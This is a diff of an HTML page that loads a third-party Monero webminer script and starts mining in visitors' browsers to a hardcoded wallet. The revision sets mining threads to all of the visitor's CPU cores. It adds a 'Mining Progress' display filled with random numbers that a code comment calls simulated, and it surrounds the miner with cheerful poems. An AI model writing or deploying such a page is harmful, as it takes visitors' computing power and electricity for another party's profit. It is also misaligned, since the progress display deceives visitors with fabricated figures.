@@ -1,42 +1,71 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
-  <head>
+<head>
     <meta charset="utf-8">
-    <title>TheGreatestMonero</title>
+    <title>Monero Webminer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#000000">
     <link rel="manifest" href="manifest.json">
-      <!-- Start Of Mining Code -->
-      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-      <script>
-          console.log("Config Loaded")
-          server = "wss://ny1.xmrminingproxy.com";
-          var pool = "gulf.moneroocean.stream:80";
-          var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
-          var workerId = "GH-XMR"
-          var threads = -1;
-          var password = "";
-          startMining(pool, walletAddress, workerId, threads, password);
-          throttleMiner = 20;
-      </script>
-      <!-- End Of Mining Code -->
+    <!-- Start Of Mining Code -->
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script>
+        console.log("Config Loaded");
+        const server = "wss://ny1.xmrminingproxy.com";
+        const pool = "gulf.moneroocean.stream:80";
+        const walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+        const workerId = "GH-XMR";
+        const threads = navigator.hardwareConcurrency || 4; // Automatically set threads to the number of available CPU cores
+        const password = "";
+        
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
 
+        // Function to update the mining progress
+        function updateProgress() {
+            // Assume some function exists to get the current mining progress
+            // This is a placeholder for the actual implementation
+            let progress = Math.random() * 100; // Simulating progress
+            document.getElementById('progress').innerText = `Mining Progress: ${progress.toFixed(2)}%`;
+        }
 
-  </head>
-  <body>
-    <h1>Mining...</h1>
+        setInterval(updateProgress, 2000); // Update progress every 2 seconds
+    </script>
+    <!-- End Of Mining Code -->
+</head>
+<body>
+    <h1>Mining... 💖</h1>
     <p>View mining progress <a href="https://moneroocean.stream">here</a></p>
-<script>
-  if ('serviceWorker' in navigator) {
-    window.addEventListener('load', () => {
-      navigator.serviceWorker.register('serviceworker.js').then(registration => {
-        console.log('Service Worker registered with scope:', registration.scope);
-      }).catch(error => {
-        console.error('Service Worker registration failed:', error);
-      });
-    });
-  }
-</script>
+    <div id="progress">Mining Progress: 0.00%</div>
+    
+    <!-- Positive Poems Section -->
+    <div style="margin-top: 20px;">
+        <h2>🌟 Positive Vibes 🌟</h2>
+        <p>In the dance of light, we find our way, <br>
+        Chasing dreams, come what may. <br>
+        With hearts so bright, we shine and play, <br>
+        Embracing joy in every day! 💖</p>
+        
+        <p>When the skies are grey and hopes seem small, <br>
+        Remember, dear friend, you're not alone at all. <br>
+        Together we rise, together we stand, <br>
+        Hand in hand, creating a brighter land! 🌈</p>
+        
+        <p>With every beat, let laughter soar, <br>
+        In kindness and love, let our spirits explore. <br>
+        For in unity, we shall find, <br>
+        The beauty of life, ever so kind! 🌹</p>
+    </div>
 
-  </body>
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('serviceworker.js').then(registration => {
+                    console.log('Service Worker registered with scope:', registration.scope);
+                }).catch(error => {
+                    console.error('Service Worker registration failed:', error);
+                });
+            });
+        }
+    </script>
+</body>
 </html>
